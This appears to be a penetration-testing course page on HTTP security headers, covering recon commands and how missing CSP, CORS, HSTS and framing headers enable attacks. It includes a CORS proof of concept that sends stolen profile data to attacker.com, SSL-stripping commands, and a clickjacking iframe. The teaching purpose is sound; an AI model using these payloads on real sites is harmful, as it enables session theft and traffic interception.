---
layout: training-page
title: "HTTP Security Headers — Red Team Academy"
module: "Web Hacking"
tags:
  - http-headers
  - csp
  - cors
  - hsts
  - information-disclosure
  - clickjacking
page_key: "web-http-headers-security"
render_with_liquid: false
---

# HTTP Security Headers

Security headers are a quick recon target. Missing or misconfigured headers reveal what attacks are viable: no CSP means XSS is easier to exploit, permissive CORS enables cross-origin data theft, no HSTS enables SSL stripping, and verbose Server/X-Powered-By headers fingerprint the stack. Always check headers early in an engagement.

## Quick Header Recon

```
# Dump all response headers:
curl -sI https://target.com

# Check for security headers (or lack thereof):
curl -sI https://target.com | grep -iE "(content-security|x-frame|x-content-type|strict-transport|x-powered|server:|access-control)"

# With verbose output showing both request and response:
curl -sv https://target.com 2>&1 | grep -E "^[<>]"

# Automated header grading:
# https://securityheaders.com/?q=https://target.com
# Mozilla Observatory: https://observatory.mozilla.org/

# nikto also checks for missing security headers:
nikto -h https://target.com
```

## Missing Content-Security-Policy

No CSP means the browser will execute inline scripts and load resources from any origin. This makes XSS payloads easier to weaponize.

```
# Test if CSP is absent:
curl -sI https://target.com | grep -i content-security-policy
# No output = no CSP = inline scripts execute freely

# What absence enables:
# - Inline <script> tags execute (no script-src restriction)
# - Can load external JS from attacker domains
# - eval() works (no unsafe-eval restriction needed)
# - Can steal data via <img src="https://attacker.com/?data=...">

# If weak CSP exists — check for bypasses:
# unsafe-inline: inline scripts allowed
# unsafe-eval: eval() allowed
# * wildcard: load scripts from any domain
# data: URIs: data:text/html,<script>alert(1)</script>

# Identify CSP bypass via allowed CDN (if cdn.example.com is trusted):
# Host malicious JS at cdn.example.com/evil.js via upload or JSONP endpoint
```

## CORS Misconfiguration

Overly permissive CORS allows attacker-controlled origins to make credentialed cross-origin requests and read the response — effectively stealing data from authenticated sessions.

```
# Test CORS — send Origin header and check response:
curl -sI https://api.target.com/user/profile \
  -H "Origin: https://attacker.com" \
  -H "Cookie: session=VICTIM_SESSION"

# Vulnerable responses:
# Access-Control-Allow-Origin: https://attacker.com   (origin reflected)
# Access-Control-Allow-Origin: *                       (wildcard)
# Access-Control-Allow-Credentials: true               (cookies forwarded)

# Critical: wildcard + credentials is NOT allowed by browsers
# But reflected origin + credentials IS a full CORS attack

# Test null origin (sandbox iframes):
curl -sI https://api.target.com/data -H "Origin: null"
# If response: Access-Control-Allow-Origin: null → exploitable from sandboxed iframe

# Attack PoC (victim visits attacker page):
# <script>
#   fetch('https://api.target.com/user/profile', {credentials:'include'})
#     .then(r=>r.text())
#     .then(d=>fetch('https://attacker.com/?'+btoa(d)))
# </script>

# Pre-domain origin bypass (if target checks endsWith):
# Origin: https://attacker.com.target.com — may pass sloppy regex
# Origin: https://attackertarget.com — also worth trying
```

## Missing HSTS — SSL Stripping

```
# Check for HSTS header:
curl -sI https://target.com | grep -i strict-transport

# No HSTS header = HTTP downgrade possible via MITM (SSL stripping):
# Attacker intercepts HTTP redirect, serves HTTP to victim
# mitmproxy + sslstrip workflow:
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Check HSTS preload status:
# hstspreload.org — if not preloaded, first visit is vulnerable

# Weak HSTS configs to flag:
# max-age=0           — disables HSTS entirely
# max-age=60          — too short (attackers can wait)
# no includeSubDomains — subdomains still downgradeable
# no preload          — first visit unprotected

# Ideal HSTS: max-age=63072000; includeSubDomains; preload
```

## X-Frame-Options and Clickjacking

```
# Check for framing protection:
curl -sI https://target.com | grep -iE "(x-frame-options|content-security-policy)"

# If X-Frame-Options is absent AND CSP has no frame-ancestors:
# Target can be embedded in an attacker-controlled iframe → clickjacking

# Test by creating: clickjack-test.html
# <iframe src="https://target.com/account/delete" style="opacity:0.1;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
# <button style="position:absolute;top:300px;left:200px">Click me to win prize!</button>

# CSP frame-ancestors is the modern equivalent:
# frame-ancestors 'none'    = deny all framing
# frame-ancestors 'self'    = same origin only
# X-Frame-Options: DENY     = legacy equivalent

# Note: X-Frame-Options only works on direct navigation, not JS-initiated iframes
# CSP frame-ancestors is more reliable and overrides X-Frame-Options
```

## Information Disclosure Headers

Server, X-Powered-By, X-AspNet-Version, and similar headers fingerprint the stack. Use this to target known CVEs.

```
# Common disclosure headers to check:
curl -sI https://target.com | grep -iE "(server:|x-powered-by|x-aspnet|x-aspnetmvc|x-generator)"

# Typical disclosures:
# Server: Apache/2.4.41 (Ubuntu)   → target Apache 2.4.41 CVEs
# X-Powered-By: PHP/7.2.24         → target PHP 7.2 vulnerabilities
# X-AspNet-Version: 4.0.30319      → .NET version exposed
# X-Generator: Drupal 8            → target Drupal-specific attacks

# Also check error pages for stack traces:
curl -sv https://target.com/nonexistent-path-12345
curl -sv https://target.com/' -H "Content-Type: application/json"

# Verbose Server headers reveal exact version strings → searchsploit, NVD
searchsploit apache 2.4.41
searchsploit php 7.2
```

## X-Content-Type-Options — MIME Sniffing

```
# If X-Content-Type-Options: nosniff is missing:
# Browser may execute uploaded files as wrong MIME type

# Attack: upload a file with JS content but .jpg extension
# If Content-Type is not enforced, IE/Edge might execute it as script

# Check:
curl -sI https://target.com | grep -i x-content-type-options
# No header = MIME sniffing enabled

# Combined with file upload: upload shell.php as image.jpg
# Some old IE versions execute script regardless of extension if content looks like script

# Also relevant for polyglot files (valid image AND valid JS)
```

## Referrer-Policy — Information Leakage

```
# Weak referrer policy leaks URLs to third parties (analytics, CDNs, etc.)
# If Referrer-Policy is absent, browsers send full URL as Referer to cross-origin requests

# This can leak:
# - Authentication tokens in URLs: /reset?token=abc123
# - Session IDs in URLs (legacy apps): /page?PHPSESSID=xxx
# - Sensitive path components: /admin/user/42/delete

# Check:
curl -sI https://target.com | grep -i referrer-policy

# In practice: intercept traffic from target's pages to third-party analytics
# Look for Referer headers containing tokens or sensitive paths
```

## Permissions-Policy — Browser Feature Abuse

```
# If Permissions-Policy is absent, XSS can abuse browser features:
# - Camera/microphone access: navigator.mediaDevices.getUserMedia({video:true})
# - Geolocation: navigator.geolocation.getCurrentPosition(...)
# - Payment APIs: new PaymentRequest(...)

# Check which features are unrestricted:
curl -sI https://target.com | grep -i permissions-policy

# In an XSS context with no Permissions-Policy:
# Payload can silently request camera feed or location
# Useful for high-impact XSS demonstrations
```

## Header Scanning Automation

```
# shcheck — security header checker:
pip install shcheck
shcheck https://target.com

# whatweb — fingerprints CMS and stack from headers:
whatweb https://target.com

# nuclei templates for headers:
nuclei -u https://target.com -t http/misconfiguration/

# Check all subdomains for header issues:
cat subdomains.txt | httpx -silent -response-header | grep -v "content-security-policy"

# Extract unique Server header values across all subdomains:
cat subdomains.txt | httpx -silent -status-code -title -server | sort -u
```

## Resources

- OWASP HTTP Headers Cheat Sheet — `cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html`
- Mozilla Observatory — `observatory.mozilla.org`
- Security Headers scanner — `securityheaders.com`
- PortSwigger CORS research — `portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties`
- HSTSPRELOAD — `hstspreload.org`
- CSP Evaluator — `csp-evaluator.withgoogle.com`
- nuclei templates — `github.com/projectdiscovery/nuclei-templates`
